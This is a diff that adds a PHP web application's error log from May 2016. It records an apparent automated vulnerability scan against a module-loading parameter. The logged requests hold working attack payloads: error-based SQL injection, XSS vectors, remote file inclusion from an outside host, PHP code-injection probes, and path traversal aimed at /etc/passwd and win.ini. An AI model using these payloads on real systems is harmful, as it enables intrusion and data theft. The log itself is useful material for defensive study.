@@ -1,0 +1,181 @@
+[ 2016-05-12T01:49:52+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset%2C%2C%28..%27%22%5B%29%22&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset,,(..'"[)"
+
+[ 2016-05-12T01:50:02+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset%29+AND+%28SELECT+1659+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x515546644255%2C%28SELECT+%28CASE+WHEN+%281659%3D1659%29+THEN+1+ELSE+0+END%29%29%2C0x666546785864%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29+AND+%281659%3D1659&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset) AND (SELECT 1659 FROM(SELECT COUNT(*),CONCAT(0x515546644255,(SELECT (CASE WHEN (1659=1659) THEN 1 ELSE 0 END)),0x666546785864,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (1659=1659
+
+[ 2016-05-12T01:50:03+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset%27%29+AND+%28SELECT+1659+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x515546644255%2C%28SELECT+%28CASE+WHEN+%281659%3D1659%29+THEN+1+ELSE+0+END%29%29%2C0x666546785864%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29+AND+%28%27GsZ%27%3D%27GsZ&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset') AND (SELECT 1659 FROM(SELECT COUNT(*),CONCAT(0x515546644255,(SELECT (CASE WHEN (1659=1659) THEN 1 ELSE 0 END)),0x666546785864,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('GsZ'='GsZ
+
+[ 2016-05-12T01:50:03+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset%27+AND+%28SELECT+1659+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x515546644255%2C%28SELECT+%28CASE+WHEN+%281659%3D1659%29+THEN+1+ELSE+0+END%29%29%2C0x666546785864%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29+AND+%27GsZ%27%3D%27GsZ&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset' AND (SELECT 1659 FROM(SELECT COUNT(*),CONCAT(0x515546644255,(SELECT (CASE WHEN (1659=1659) THEN 1 ELSE 0 END)),0x666546785864,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'GsZ'='GsZ
+
+[ 2016-05-12T01:50:03+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset%25%27+AND+%28SELECT+1659+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x515546644255%2C%28SELECT+%28CASE+WHEN+%281659%3D1659%29+THEN+1+ELSE+0+END%29%29%2C0x666546785864%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29+AND+%27%25%27%3D%27&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset%' AND (SELECT 1659 FROM(SELECT COUNT(*),CONCAT(0x515546644255,(SELECT (CASE WHEN (1659=1659) THEN 1 ELSE 0 END)),0x666546785864,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
+
+[ 2016-05-12T01:50:04+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset+AND+%28SELECT+1659+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x515546644255%2C%28SELECT+%28CASE+WHEN+%281659%3D1659%29+THEN+1+ELSE+0+END%29%29%2C0x666546785864%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29--+GsZ&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset AND (SELECT 1659 FROM(SELECT COUNT(*),CONCAT(0x515546644255,(SELECT (CASE WHEN (1659=1659) THEN 1 ELSE 0 END)),0x666546785864,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- GsZ
+
+[ 2016-05-12T01:50:04+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset+AND+%28SELECT+1659+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x515546644255%2C%28SELECT+%28CASE+WHEN+%281659%3D1659%29+THEN+1+ELSE+0+END%29%29%2C0x666546785864%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset AND (SELECT 1659 FROM(SELECT COUNT(*),CONCAT(0x515546644255,(SELECT (CASE WHEN (1659=1659) THEN 1 ELSE 0 END)),0x666546785864,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+[ 2016-05-12T02:34:37+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset%29.%28.%28%27.%22%22%29&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset).(.('."")
+
+[ 2016-05-12T02:34:44+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset%29+AND+%28SELECT+1521+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x684b4d5a6c58%2C%28SELECT+%28CASE+WHEN+%281521%3D1521%29+THEN+1+ELSE+0+END%29%29%2C0x7a6371737675%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29+AND+%281521%3D1521&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset) AND (SELECT 1521 FROM(SELECT COUNT(*),CONCAT(0x684b4d5a6c58,(SELECT (CASE WHEN (1521=1521) THEN 1 ELSE 0 END)),0x7a6371737675,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (1521=1521
+
+[ 2016-05-12T02:34:45+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset%27%29+AND+%28SELECT+1521+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x684b4d5a6c58%2C%28SELECT+%28CASE+WHEN+%281521%3D1521%29+THEN+1+ELSE+0+END%29%29%2C0x7a6371737675%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29+AND+%28%27VAm%27%3D%27VAm&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset') AND (SELECT 1521 FROM(SELECT COUNT(*),CONCAT(0x684b4d5a6c58,(SELECT (CASE WHEN (1521=1521) THEN 1 ELSE 0 END)),0x7a6371737675,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('VAm'='VAm
+
+[ 2016-05-12T02:34:45+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset%27+AND+%28SELECT+1521+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x684b4d5a6c58%2C%28SELECT+%28CASE+WHEN+%281521%3D1521%29+THEN+1+ELSE+0+END%29%29%2C0x7a6371737675%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29+AND+%27VAm%27%3D%27VAm&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset' AND (SELECT 1521 FROM(SELECT COUNT(*),CONCAT(0x684b4d5a6c58,(SELECT (CASE WHEN (1521=1521) THEN 1 ELSE 0 END)),0x7a6371737675,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'VAm'='VAm
+
+[ 2016-05-12T02:34:49+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset%25%27+AND+%28SELECT+1521+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x684b4d5a6c58%2C%28SELECT+%28CASE+WHEN+%281521%3D1521%29+THEN+1+ELSE+0+END%29%29%2C0x7a6371737675%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29+AND+%27%25%27%3D%27&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset%' AND (SELECT 1521 FROM(SELECT COUNT(*),CONCAT(0x684b4d5a6c58,(SELECT (CASE WHEN (1521=1521) THEN 1 ELSE 0 END)),0x7a6371737675,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
+
+[ 2016-05-12T02:34:49+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset+AND+%28SELECT+1521+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x684b4d5a6c58%2C%28SELECT+%28CASE+WHEN+%281521%3D1521%29+THEN+1+ELSE+0+END%29%29%2C0x7a6371737675%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29--+VAm&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset AND (SELECT 1521 FROM(SELECT COUNT(*),CONCAT(0x684b4d5a6c58,(SELECT (CASE WHEN (1521=1521) THEN 1 ELSE 0 END)),0x7a6371737675,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- VAm
+
+[ 2016-05-12T02:34:49+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset+AND+%28SELECT+1521+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x684b4d5a6c58%2C%28SELECT+%28CASE+WHEN+%281521%3D1521%29+THEN+1+ELSE+0+END%29%29%2C0x7a6371737675%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset AND (SELECT 1521 FROM(SELECT COUNT(*),CONCAT(0x684b4d5a6c58,(SELECT (CASE WHEN (1521=1521) THEN 1 ELSE 0 END)),0x7a6371737675,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+[ 2016-05-12T02:43:27+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset%5D%5D%29%2C%2C%5D%28%5B%27%29&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset]]),,]([')
+
+[ 2016-05-12T02:43:34+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset%29+AND+%28SELECT+1250+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x414b53536159%2C%28SELECT+%28CASE+WHEN+%281250%3D1250%29+THEN+1+ELSE+0+END%29%29%2C0x6f4771525977%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29+AND+%281250%3D1250&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset) AND (SELECT 1250 FROM(SELECT COUNT(*),CONCAT(0x414b53536159,(SELECT (CASE WHEN (1250=1250) THEN 1 ELSE 0 END)),0x6f4771525977,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (1250=1250
+
+[ 2016-05-12T02:43:34+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset%27%29+AND+%28SELECT+1250+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x414b53536159%2C%28SELECT+%28CASE+WHEN+%281250%3D1250%29+THEN+1+ELSE+0+END%29%29%2C0x6f4771525977%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29+AND+%28%27Otl%27%3D%27Otl&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset') AND (SELECT 1250 FROM(SELECT COUNT(*),CONCAT(0x414b53536159,(SELECT (CASE WHEN (1250=1250) THEN 1 ELSE 0 END)),0x6f4771525977,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('Otl'='Otl
+
+[ 2016-05-12T02:43:35+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset%27+AND+%28SELECT+1250+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x414b53536159%2C%28SELECT+%28CASE+WHEN+%281250%3D1250%29+THEN+1+ELSE+0+END%29%29%2C0x6f4771525977%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29+AND+%27Otl%27%3D%27Otl&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset' AND (SELECT 1250 FROM(SELECT COUNT(*),CONCAT(0x414b53536159,(SELECT (CASE WHEN (1250=1250) THEN 1 ELSE 0 END)),0x6f4771525977,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'Otl'='Otl
+
+[ 2016-05-12T02:43:38+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset%25%27+AND+%28SELECT+1250+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x414b53536159%2C%28SELECT+%28CASE+WHEN+%281250%3D1250%29+THEN+1+ELSE+0+END%29%29%2C0x6f4771525977%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29+AND+%27%25%27%3D%27&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset%' AND (SELECT 1250 FROM(SELECT COUNT(*),CONCAT(0x414b53536159,(SELECT (CASE WHEN (1250=1250) THEN 1 ELSE 0 END)),0x6f4771525977,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
+
+[ 2016-05-12T02:43:39+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset+AND+%28SELECT+1250+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x414b53536159%2C%28SELECT+%28CASE+WHEN+%281250%3D1250%29+THEN+1+ELSE+0+END%29%29%2C0x6f4771525977%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29--+Otl&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset AND (SELECT 1250 FROM(SELECT COUNT(*),CONCAT(0x414b53536159,(SELECT (CASE WHEN (1250=1250) THEN 1 ELSE 0 END)),0x6f4771525977,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- Otl
+
+[ 2016-05-12T02:43:39+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asset+AND+%28SELECT+1250+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x414b53536159%2C%28SELECT+%28CASE+WHEN+%281250%3D1250%29+THEN+1+ELSE+0+END%29%29%2C0x6f4771525977%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=0&catid=0
+ERR: 无法加载模块:Asset AND (SELECT 1250 FROM(SELECT COUNT(*),CONCAT(0x414b53536159,(SELECT (CASE WHEN (1250=1250) THEN 1 ELSE 0 END)),0x6f4771525977,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+[ 2016-05-12T02:44:07+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=asseti1231444i&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:Asseti1231444i
+
+[ 2016-05-12T02:48:04+08:00 ] 121.42.0.61 /index.php?a=swfupload&m=asset&g=asset'%22%3E%3Ciframe%20onload=alert()%3E&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:Asset'">
+
+[ 2016-05-12T02:48:54+08:00 ] 121.42.0.59 /index.php?a=swfupload&m=asset&g=asset'%22%3E%3Cimg%20src=x%20onerror=prompt()%3E&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:Asset'">
+
+[ 2016-05-12T02:49:28+08:00 ] 121.42.0.73 /index.php?a=swfupload&m=asset&g=asset'%22%3E%3Csvg%20onload=prompt()%3E&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:Asset'">
+
+[ 2016-05-12T02:50:59+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=http://120.26.55.211/s.txt&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:Http://120.26.55.211/s.txt
+
+[ 2016-05-12T02:51:17+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=http%3A%2F%2F120.26.55.211%2Fs.txt&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:Http://120.26.55.211/s.txt
+
+[ 2016-05-12T02:51:18+08:00 ] 121.42.0.87 /index.php?g=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+[ 2016-05-12T02:51:31+08:00 ] 121.42.0.87 /index.php?g=amF2YXNjcmlwdDpwcm9tcHQoMTExKTt4&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:AmF2YXNjcmlwdDpwcm9tcHQoMTExKTt4
+
+[ 2016-05-12T02:51:31+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=a_long_name_file_not_exist&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:A_long_name_file_not_exist
+
+[ 2016-05-12T02:51:47+08:00 ] 121.42.0.87 /index.php?g=useri1231444i&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:Useri1231444i
+
+[ 2016-05-12T02:51:58+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}
+
+[ 2016-05-12T02:52:18+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}\
+
+[ 2016-05-12T02:52:32+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:Print(md5(this_is_a_test_string));die();/*
+
+[ 2016-05-12T02:52:50+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=%2Fetc%2Fpasswd&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:/etc/passwd
+
+[ 2016-05-12T02:55:10+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=c%3A%2F%2Fwindows%2Fwin.ini&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:C://windows/win.ini
+
+[ 2016-05-12T02:57:15+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:../../../../../../../../etc/passwd
+
+[ 2016-05-12T02:58:45+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:../../../../../../../../../../etc/passwd%00
+
+[ 2016-05-12T02:58:54+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini00&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:../../../../../../../../../../windows/win.ini00
+
+[ 2016-05-12T02:59:30+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:../../../../../../../../windows/win.ini.jpg
+
+[ 2016-05-12T02:59:48+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%0a.jpg&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:../../../../../../../../etc/passwd
+.jpg
+
+[ 2016-05-12T03:00:23+08:00 ] 121.42.0.87 /index.php?a=swfupload&m=asset&g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%0a.jpg&args=1,jpg%7Cjpeg%7Cgif%7Cpng%7Cbmp,1,,,1&module=&catid=
+ERR: 无法加载模块:../../../../../../../../windows/win.ini
+.jpg
+
+[ 2016-05-12T03:05:14+08:00 ] 121.42.0.67 /index.php?g=user'%22%3E%3Ciframe%20onload=alert()%3E&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:User'">
+
+[ 2016-05-12T03:05:27+08:00 ] 121.42.0.62 /index.php?g=user'%22%3E%3Cimg%20src=x%20onerror=prompt()%3E&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:User'">
+
+[ 2016-05-12T03:06:05+08:00 ] 121.42.0.63 /index.php?g=user'%22%3E%3Csvg%20onload=prompt()%3E&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:User'">
+
+[ 2016-05-12T03:06:29+08:00 ] 121.42.0.87 /index.php?g=http://120.26.55.211/s.txt&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:Http://120.26.55.211/s.txt
+
+[ 2016-05-12T03:06:42+08:00 ] 121.42.0.87 /index.php?g=http%3A%2F%2F120.26.55.211%2Fs.txt&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:Http://120.26.55.211/s.txt
+
+[ 2016-05-12T03:07:58+08:00 ] 121.42.0.87 /index.php?g=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}
+
+[ 2016-05-12T03:09:28+08:00 ] 121.42.0.87 /index.php?g=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:Print(md5(this_is_a_test_string));die();/*
+
+[ 2016-05-12T03:11:57+08:00 ] 121.42.0.87 /index.php?g=%2Fetc%2Fpasswd&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:/etc/passwd
+
+[ 2016-05-12T03:12:50+08:00 ] 121.42.0.87 /index.php?g=c%3A%2F%2Fwindows%2Fwin.ini&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:C://windows/win.ini
+
+[ 2016-05-12T03:13:21+08:00 ] 121.42.0.87 /index.php?g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:../../../../../../../../etc/passwd
+
+[ 2016-05-12T03:13:30+08:00 ] 121.42.0.87 /index.php?g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:../../../../../../../../windows/win.ini
+
+[ 2016-05-12T03:13:53+08:00 ] 121.42.0.87 /index.php?g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:../../../../../../../../../../etc/passwd%00
+
+[ 2016-05-12T03:14:09+08:00 ] 121.42.0.87 /index.php?g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini00&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:../../../../../../../../../../windows/win.ini00
+
+[ 2016-05-12T03:14:22+08:00 ] 121.42.0.87 /index.php?g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:../../../../../../../../etc/passwd.jpg
+
+[ 2016-05-12T03:14:44+08:00 ] 121.42.0.87 /index.php?g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:../../../../../../../../windows/win.ini.jpg
+
+[ 2016-05-12T03:14:52+08:00 ] 121.42.0.87 /index.php?g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%0a.jpg&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:../../../../../../../../etc/passwd
+.jpg
+
+[ 2016-05-12T03:15:27+08:00 ] 121.42.0.87 /index.php?g=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%0a.jpg&m=favorite&a=do_dsfav&id=5
+ERR: 无法加载模块:../../../../../../../../windows/win.ini
+.jpg
+
